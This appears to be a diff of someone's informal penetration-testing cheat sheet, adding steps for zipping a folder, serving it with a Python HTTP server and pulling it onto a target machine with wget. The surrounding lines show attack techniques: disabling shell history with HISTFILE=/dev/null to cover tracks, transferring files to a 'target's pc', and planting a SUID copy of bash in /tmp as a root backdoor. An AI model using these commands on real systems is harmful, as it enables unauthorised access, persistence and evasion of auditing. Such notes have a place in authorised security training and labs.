@@ -27,6 +27,12 @@ export HISTFILE=/dev/null
    --> python3 -m http.server 8888 (in the directory of yhe file you want to send)
    --> wget http://<myIP>:<port>/filename   (at target's pc)
 
+if you want to mnove a folder:
+1.zip -r newname.zip thefoldername/
+2. python3 -m http.server 80 
+3. wget ......
+4. unzip
+
 
 4. cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
    cd /tmp
